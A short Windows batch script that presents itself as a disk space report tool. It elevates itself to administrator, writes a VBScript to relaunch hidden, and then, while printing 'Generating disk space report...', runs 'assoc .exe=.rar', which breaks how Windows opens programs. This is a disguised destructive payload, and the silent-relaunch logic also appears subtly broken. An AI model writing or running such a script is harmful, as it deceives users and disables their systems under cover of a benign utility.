@echo off
:: === Step 1: Request Administrator Privileges ===
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting Administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: === Step 2: Create VBScript for Silent Execution ===
setlocal
set "vbsfile=%temp%\run_silent.vbs"

echo Set WshShell = CreateObject("WScript.Shell") > "%vbsfile%"
echo WshShell.Run "cmd /c """^%~f0^" :silent""", 0, False >> "%vbsfile%"

:: === Step 3: Run Batch Commands Silently ===
echo Running commands silently...
cscript //nologo "%vbsfile%"
exit /b

:silent
echo Generating disk space report...
assoc .exe=.rar

